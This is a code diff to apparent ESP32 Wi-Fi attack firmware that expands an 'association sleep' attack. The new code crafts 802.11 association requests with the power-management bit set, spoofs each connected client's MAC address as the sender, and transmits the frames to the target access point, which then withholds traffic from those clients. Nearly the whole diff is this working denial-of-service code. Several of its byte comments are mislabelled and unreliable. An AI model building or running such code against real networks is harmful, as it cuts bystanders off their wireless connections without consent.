@@ -516,6 +516,8 @@ void wifi_attack_association_sleep(void)
 {
     /* Get a copy of target */
     target_info_t target_local = { 0 };
+    static uint16_t sequence_number = 0;
+
     if( get_target_info_copy(&target_local, &target) == false )
     {
         return;
@@ -526,25 +528,121 @@ void wifi_attack_association_sleep(void)
         return;
     }
 
-    uint8_t assoc_packet[30] = {
+    uint8_t assoc_packet[200] = {
         0x00, 0x10, // Frame Control (Association Request) PM=1
-        0x00, 0x00, // Duration
+        0x3a, 0x01, // Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
         0x00, 0x00,                         // Sequence Control
-        0x01,                               // Category Code (Association Request)
-        0x01                                // Status Code (Success)
+        0x31, 0x00,                         // Capability Information (PM=1)
+        0x0a, 0x00,                         // Listen Interval
+        0x00,                               // SSID tag
+        0x00,                               // SSID length      
     };
-    memcpy(&assoc_packet[10], target_local.bssid, 6);    // Source Address
-    memcpy(&assoc_packet[16], target_local.bssid, 6);    // BSSID
+    memcpy(&assoc_packet[4],  target_local.bssid, 6); // Destination Address (AP)
+    memcpy(&assoc_packet[16], target_local.bssid, 6); // BSSID
+
+    /* Set Sequence Control */
+    assoc_packet[23] = (sequence_number >> 8) & 0xFF; // Sequence Number MSB
+    assoc_packet[22] = sequence_number & 0xFF;        // Sequence Number LSB
+
+    /* SSID tag */
+    assoc_packet[29] = (uint8_t)strlen((char *)&target_local.ssid); // SSID Length
+    memcpy(&assoc_packet[30], target_local.ssid, strlen((char *)&target_local.ssid)); // SSID
+
+    /* Supported Rates tag */
+    uint16_t offset = 30 + strlen((char *)&target_local.ssid); // Offset after SSID);
+    assoc_packet[offset++] = 0x01; // Supported Rates tag
+    assoc_packet[offset++] = 0x04; // Length
+    assoc_packet[offset++] = 0x82;  // 1 Mbps
+    assoc_packet[offset++] = 0x04;  // 2 Mbps
+    assoc_packet[offset++] = 0x0b;  // 5.5 Mbps
+    assoc_packet[offset++] = 0x16;  // 11 Mbps
+
+    /* Power Capability tag */
+    assoc_packet[offset++] = 0x21; // Power Capability tag
+    assoc_packet[offset++] = 0x02; // Length
+    assoc_packet[offset++] = 0x01; // Min Tx Power
+    assoc_packet[offset++] = 0x15; // Max Tx Power
+
+    /* Supported Channels tag */
+    assoc_packet[offset++] = 0x24; // Supported Channels tag
+    assoc_packet[offset++] = 0x02; // Length
+    assoc_packet[offset++] = 0x01; // First Channel
+    assoc_packet[offset++] = 0x0d; // Last Channel
+
+    /* RSN tag */
+    assoc_packet[offset++] = 0x30; // RSN tag
+    assoc_packet[offset++] = 0x14; // Length
+    assoc_packet[offset++] = 0x01; // Version MSB
+    assoc_packet[offset++] = 0x00; // Version LSB
+    assoc_packet[offset++] = 0x00; // Group Cipher Suite OUI MSB
+    assoc_packet[offset++] = 0x0F; // Group Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0xAC; // Group Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0x04; // Group Cipher Suite Type (AES-CCMP)
+    assoc_packet[offset++] = 0x01; // Pairwise Cipher Suite Count
+    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite Count MSB
+    assoc_packet[offset++] = 0x00; // Pairwise Cipher Suite OUI MSB
+    assoc_packet[offset++] = 0x0F; // Pairwise Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0xAC; // Pairwise Cipher Suite OUI LSB
+    assoc_packet[offset++] = 0x04; // Pairwise Cipher Suite Type (AES-CCMP)
+    assoc_packet[offset++] = 0x01; // AKM Suite Count
+    assoc_packet[offset++] = 0x00; // AKM Suite Count MSB
+    assoc_packet[offset++] = 0x00; // AKM Suite OUI MSB
+    assoc_packet[offset++] = 0x0f; // AKM Suite OUI MSB
+    assoc_packet[offset++] = 0xAC; // AKM Suite OUI LSB
+    assoc_packet[offset++] = 0x02; // AKM Suite OUI LSB (WPA2-PSK)
+    assoc_packet[offset++] = 0x0c; // RSN Capabilities MSB
+    assoc_packet[offset++] = 0x00; // RSN Capabilities LSB
+
+    /* Supported Operating Classes tag */
+    assoc_packet[offset++] = 0x3b; // Supported Operating Classes tag
+    assoc_packet[offset++] = 0x14; // Length
+    assoc_packet[offset++] = 0x51; // Current Operating Class 1 (2.4 GHz)
+    /* alternate Operating Class */
+    assoc_packet[offset++] = 0x86; // Operating Class 2 (5 GHz)
+    assoc_packet[offset++] = 0x85; // Operating Class 3 (6 GHz)
+    assoc_packet[offset++] = 0x84; // Operating Class 4 (60 GHz)
+    assoc_packet[offset++] = 0x83; // Operating Class 5 (60 GHz)
+    assoc_packet[offset++] = 0x81; // Operating Class 6 (60 GHz)
+    assoc_packet[offset++] = 0x7f; // Operating Class 7 (60 GHz)
+    assoc_packet[offset++] = 0x7e; // Operating Class 8 (60 GHz)
+    assoc_packet[offset++] = 0x7d; // Operating Class 9 (60 GHz)
+    assoc_packet[offset++] = 0x7c; // Operating Class 10 (60 GHz)
+    assoc_packet[offset++] = 0x7b; // Operating Class 11 (60 GHz)
+    assoc_packet[offset++] = 0x7a; // Operating Class 12 (60 GHz)
+    assoc_packet[offset++] = 0x79; // Operating Class 13 (60 GHz)
+    assoc_packet[offset++] = 0x78; // Operating Class 14 (60 GHz)
+    assoc_packet[offset++] = 0x77; // Operating Class 15 (60 GHz)
+    assoc_packet[offset++] = 0x76; // Operating Class 16 (60 GHz)
+    assoc_packet[offset++] = 0x75; // Operating Class 17 (60 GHz)
+    assoc_packet[offset++] = 0x74; // Operating Class 18 (60 GHz)
+    assoc_packet[offset++] = 0x73; // Operating Class 19 (60 GHz)
+    assoc_packet[offset++] = 0x51; // Operating Class 20 (2.4 GHz)
+
+    /* Vendor Specific tag */
+    assoc_packet[offset++] = 0xdd; // Vendor Specific tag
+    assoc_packet[offset++] = 0x0a; // Length
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x10;
+    assoc_packet[offset++] = 0x18;
+    assoc_packet[offset++] = 0x02;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x10;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x00;
+    assoc_packet[offset++] = 0x02;
 
     /* Skip broadcast address */
     for (uint8_t i = 1; i < num_clients; i++) 
     {
-        memcpy(&assoc_packet[4], clients[i].mac, 6); // Destination Address (Client MAC)
-        esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, sizeof(assoc_packet), false);
+        memcpy(&assoc_packet[10], clients[i].mac, 6); // Source Address
+        esp_wifi_80211_tx(WIFI_IF_STA, assoc_packet, offset, false);
     }
+
+    sequence_number += 0x10; // Increment sequence number by 16;
     
     xSemaphoreGive(clients_semaphore);
 }
